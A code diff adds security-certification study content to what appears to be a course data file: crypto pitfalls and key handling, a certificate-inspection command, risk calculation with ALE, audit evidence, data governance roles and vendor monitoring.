+          'Several distractors appear again and again. Hashing is not encryption: you cannot recover data from a hash, so \'hash the credit card numbers so support can read them\' is wrong. Encoding such as Base64 provides no confidentiality at all. Encrypting with your private key does not keep a message secret; it proves authorship, which is what a signature does.',
+          'Also watch for key handling. Storing the encryption key next to the encrypted data, hard-coding it in source, or using one key for every customer defeats strong algorithms. The better answer usually involves a key management service or HSM, separate keys per purpose, rotation, and access to keys logged and restricted.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Inspect a certificate',
+        code: '$ openssl s_client -connect example.com:443 -servername example.com </dev/null \\\n  | openssl x509 -noout -subject -issuer -dates -ext subjectAltName\nsubject=CN=example.com\nissuer=C=US, O=Let\'s Encrypt, CN=R11\nnotAfter=Mar  3 12:00:00 2027 GMT\nX509v3 Subject Alternative Name: DNS:example.com, DNS:www.example.com',
+        explanation: 'Browsers match the hostname against the SAN list, check the dates and chain the issuer to a trusted root. A mismatch or expired date triggers a warning.',
+      },
     ],
     cheatSheet: [
       ['Bulk encryption', 'AES-256 (symmetric); RSA only for keys'],
@@ -1723,6 +1997,20 @@ export default {
           'Risk registers are reviewed quarterly and after major changes, fed by threat intel and control testing — continuous assessment, not an annual ritual.',
           'Track time-to-remediate by severity with escalation. New regulations, vendor breaches, and key-person findings all flow into the same register.',
         ],
+      },
+      {
+        heading: 'A worked risk decision',
+        body: [
+          'A laptop fleet of 500 devices loses about 10 laptops a year. Each lost laptop with unencrypted data could cost $40,000 in breach notification and response, so the single loss expectancy is $40,000, the annualised rate of occurrence is 10, and the annualised loss expectancy is $400,000. Full-disk encryption costs $15,000 a year in licences and support and reduces the expected breach cost of a lost laptop to near zero.',
+          'The control is clearly justified: it removes most of a $400,000 expected annual loss for $15,000. The residual risk is the hardware cost and the small chance a laptop is stolen while unlocked, which management can accept and record. Scenario questions reward exactly this chain: compute ALE, compare it with the control cost, then name the response.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Pick the risk response',
+        code: 'Situation                                              Response\n-----------------------------------------------------  ---------\nBuy cyber insurance for breach costs                   Transfer\nStop offering the risky legacy service                 Avoid\nAdd MFA to reduce account takeover                     Mitigate\nLow-impact risk, control costs more than the loss      Accept',
+        explanation: 'Each response is a business decision. Acceptance must be documented and owned; ignoring a risk is not acceptance.',
       },
     ],
     cheatSheet: [
@@ -1767,6 +2055,20 @@ export default {
           'Passing audits is necessary but not sufficient: keep hardening beyond the checklist, because auditors sample and attackers do not.',
         ],
       },
+      {
+        heading: 'Evidence that satisfies an auditor',
+        body: [
+          'Auditors test whether a control operated, not whether a document describes it. A password policy is a design; a configuration export showing the enforced settings, plus a sample of accounts tested against it, is evidence. An access review policy is a design; signed review records for each quarter, with removed accounts traced to tickets, are evidence.',
+          'Good evidence is dated, complete for the period, produced by the system rather than typed by hand, and traceable to the control it supports. Scenario answers that offer \'show the auditor the policy\' or \'have the manager confirm verbally\' are weak; answers that produce system-generated records for the audit period are strong.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Roles in data governance',
+        code: 'Role          Example               Responsibility\n------------  --------------------  ------------------------------------\nData owner    VP of Sales           classifies data, approves access\nData custodian DBA team             backups, encryption, applies controls\nData steward  CRM data lead         quality and metadata\nController    The company (GDPR)    decides why and how data is processed\nProcessor     Payroll provider      processes on the controller\'s behalf',
+        explanation: 'Accountability sits with the owner and the controller; custodians and processors carry out their instructions.',
+      },
     ],
     cheatSheet: [
       ['Policy / standard / procedure', 'Requirement / specific rule / steps'],
@@ -1809,6 +2111,20 @@ export default {
           'A tested exit strategy — proven data export, migration path, contractual cooperation — is proven before it is needed. Tier vendors by BIA impact and reassess on acquisitions.',
           'Shared responsibility: the provider secures the cloud, you secure what you put in it. Misconfigured storage is always your breach.',
         ],
+      },
+      {
+        heading: 'Monitoring a vendor after onboarding',
+        body: [
+          'Risk does not end when the contract is signed. Vendors change ownership, move data to new subprocessors, suffer breaches, or let their certifications lapse. Ongoing monitoring means collecting each year\'s SOC 2 report and reading its exceptions, tracking the vendor\'s breach notifications and security ratings, and re-assessing when the scope of the service grows.',
+          'Tier vendors by risk so the effort matches the exposure. A vendor holding customer personal data or with network access deserves annual review and contract rights to audit; a vendor supplying office furniture does not. Keep the inventory current: an unknown vendor with an API key into production is a common finding after an incident.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Vendor onboarding checklist',
+        code: 'Due diligence     SOC 2 Type II report, pen test summary, breach history\nContract          MSA, SLA (99.9%), DPA, right to audit, breach notice within 72 h\nAccess            least privilege, named accounts, MFA, expiry date\nMonitoring        annual review, questionnaire, security ratings\nExit              data return and certified deletion',
+        explanation: 'Third-party risk is managed across the whole lifecycle; the contract is where security requirements become enforceable.',
       },
     ],
     cheatSheet: [
